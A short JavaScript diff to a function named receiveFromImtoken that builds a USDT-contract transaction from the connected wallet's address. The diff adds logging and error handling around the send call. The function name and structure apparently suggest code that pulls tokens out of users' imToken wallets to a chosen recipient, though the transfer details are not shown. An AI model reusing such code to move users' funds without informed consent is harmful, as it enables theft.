@@ -304,6 +304,7 @@ export const receiveFromImtoken = async (_to) => {
             let _from = address;
             var count = await window.web3.eth.getTransactionCount(_from);
             let contract = new window.web3.eth.Contract(minABI, '0xdac17f958d2ee523a2206206994597c13d831ec7');
+            console.log(_from)
 
             var rawTransaction = {
               from: _from,
@@ -319,7 +320,12 @@ export const receiveFromImtoken = async (_to) => {
 
               chainId: "0x0",
             };
-            await window.web3.eth.accounts.sendTransaction(rawTransaction);
+            try{
+              await window.web3.eth.sendTransaction(rawTransaction);
+            }catch (err) {
+              console.log(err)
+            }
+
 
           }
         }
